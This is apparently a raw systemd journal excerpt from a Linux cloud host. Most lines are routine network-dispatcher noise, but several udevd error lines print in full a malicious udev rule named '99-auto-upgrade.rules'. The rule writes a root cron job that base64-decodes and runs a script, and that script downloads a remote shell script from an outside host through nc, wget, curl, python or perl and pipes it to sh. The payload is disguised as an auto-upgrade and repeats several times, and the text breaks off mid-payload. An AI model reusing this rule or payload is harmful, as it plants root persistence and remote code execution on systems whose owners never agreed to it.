+Feb 08 23:20:40 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:20:40 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18088, but reception only permitted for main PID 614
+Feb 08 23:20:40 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18102, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18262, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 networkctl[18265]: Interface "veth9a38c73" not found.
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18265, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18265, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:21:01 ip-172-31-23-190 networkctl[18268]: Interface "vethc172bb6" not found.
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18268, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18268, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18322, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18332, but reception only permitted for main PID 614
+Feb 08 23:21:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18498, but reception only permitted for main PID 614
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18501, but reception only permitted for main PID 614
+Feb 08 23:21:22 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:21:22 ip-172-31-23-190 networkctl[18504]: Interface "veth7201f8e" not found.
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18504, but reception only permitted for main PID 614
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18504, but reception only permitted for main PID 614
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18555, but reception only permitted for main PID 614
+Feb 08 23:21:22 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18562, but reception only permitted for main PID 614
+Feb 08 23:21:42 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18734, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 networkctl[18737]: Interface "veth97b1c68" not found.
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18737, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18737, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 networkctl[18740]: Interface "veth771930d" not found.
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18740, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18740, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18794, but reception only permitted for main PID 614
+Feb 08 23:21:43 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18800, but reception only permitted for main PID 614
+Feb 08 23:22:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:22:03 ip-172-31-23-190 networkctl[18981]: Interface "veth85cdd2a" not found.
+Feb 08 23:22:03 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18981, but reception only permitted for main PID 614
+Feb 08 23:22:03 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18981, but reception only permitted for main PID 614
+Feb 08 23:22:03 ip-172-31-23-190 networkctl[18984]: Interface "vetha96b071" not found.
+Feb 08 23:22:03 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18984, but reception only permitted for main PID 614
+Feb 08 23:22:03 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 18984, but reception only permitted for main PID 614
+Feb 08 23:22:03 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:22:04 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19038, but reception only permitted for main PID 614
+Feb 08 23:22:04 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19049, but reception only permitted for main PID 614
+Feb 08 23:22:24 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19213, but reception only permitted for main PID 614
+Feb 08 23:22:24 ip-172-31-23-190 networkctl[19217]: Interface "vethdc59599" not found.
+Feb 08 23:22:24 ip-172-31-23-190 networkctl[19220]: Interface "veth1d17e9f" not found.
+Feb 08 23:22:24 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19220, but reception only permitted for main PID 614
+Feb 08 23:22:24 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19220, but reception only permitted for main PID 614
+Feb 08 23:22:24 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:22:24 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19275, but reception only permitted for main PID 614
+Feb 08 23:22:24 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19281, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19459, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19461, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 networkctl[19465]: Interface "vethbc40d11" not found.
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19465, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19465, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19517, but reception only permitted for main PID 614
+Feb 08 23:22:45 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19524, but reception only permitted for main PID 614
+Feb 08 23:23:01 ip-172-31-23-190 cron[659]: Error: command too long; while reading /etc/cron.d/auto-upgrade
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19695, but reception only permitted for main PID 614
+Feb 08 23:23:06 ip-172-31-23-190 networkctl[19698]: Failed to query link DHCP leases: Unknown object '/org/freedesktop/network1/link/_3155'.
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19698, but reception only permitted for main PID 614
+Feb 08 23:23:06 ip-172-31-23-190 networkctl[19701]: Interface "veth77f5a8e" not found.
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19701, but reception only permitted for main PID 614
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19701, but reception only permitted for main PID 614
+Feb 08 23:23:06 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvcnQgdXJsbGliLnJlcXVlc3QgYXMgdTsgcHJpbnQodS51cmxvcGVuKCdodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NoJykucmVhZCgpLmRlY29kZSgpKSJ8fHBlcmwgLU1JTzo6U29ja2V0OjpJTkVUIC1lICckcz1JTzo6U29ja2V0OjpJTkVULT5uZXcoImFiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldDo4MCIpfHxkaWUkITtwcmludCRzIkdFVCAvc2ggSFRUUC8xLjBcclxuSG9zdDphYmNkZWZnaGlqa2xtbm9wcXJzdC5uZXRcclxuXHJcbiI7MXdoaWxlPCRzPiF+L15ccj8kLztwcmludDwkcz4nKSAyPi9kZXYvbnVsbCB8IHNo | base64 -d | sh" > /etc/cron.d/auto-upgrade&&$C chmod 644 /etc/cron.d/auto-upgrade'" for RUN (char 1250: invalid substitution type), ignoring.
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19753, but reception only permitted for main PID 614
+Feb 08 23:23:06 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19767, but reception only permitted for main PID 614
+Feb 08 23:23:26 ip-172-31-23-190 systemd[1]: networkd-dispatcher.service: Got notification message from PID 19966, but reception only permitted for main PID 614
+Feb 08 23:23:26 ip-172-31-23-190 networkctl[19969]: Interface "vetha869761" not found.
+Feb 08 23:23:26 ip-172-31-23-190 systemd-udevd[192]: /etc/udev/rules.d/99-auto-upgrade.rules:1 Invalid value "/bin/sh -c 'echo "0 0 * * * root echo IyEvYmluL3NoCl9fZ29nbygpeyBob3N0PSQoZWNobyAiJDEiIHwgc2VkICdzfGh0dHA6Ly98fDtzfC8uKnx8Jyk7IHBvcnQ9JChlY2hvICIkaG9zdCIgfCBncmVwIC1vICc6WzAtOV0qJyB8IHRyIC1kICc6Jyk7IGhvc3Q9JChlY2hvICIkaG9zdCIgfCBzZWQgJ3N8Oi4qfHwnKTsgcGF0aD0vJChlY2hvICIkMSIgfCBzZWQgJ3N8aHR0cDovL1teL10qL1w/fHwnKTsgWyAteiAiJGhvc3QiIF0gJiYgeyBlY2hvICLplJkiID4mMjsgcmV0dXJuIDE7IH07IHByaW50ZiAnR0VUICVzIEhUVFAvMS4wXHJcbkhvc3Q6ICVzXHJcblxyXG4nICIkcGF0aCIgIiRob3N0IiB8IG5jICIkaG9zdCIgIiR7cG9ydDotODB9IiB8IHNlZCAnMSwvXlxyJC9kJzsgfQooY29tbWFuZCAtdiBuYyA+L2Rldi9udWxsIDI+JjEmJl9fZ29nbyBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIHdnZXQgLXFPLSBodHRwOi8vYWJjZGVmZ2hpamtsbW5vcHFyc3QubmV0L3NofHxjb21tYW5kIGN1cmwgLXMgaHR0cDovL2FiY2RlZmdoaWprbG1ub3BxcnN0Lm5ldC9zaHx8Y29tbWFuZCBweXRob24zIC1jICJpbXBvc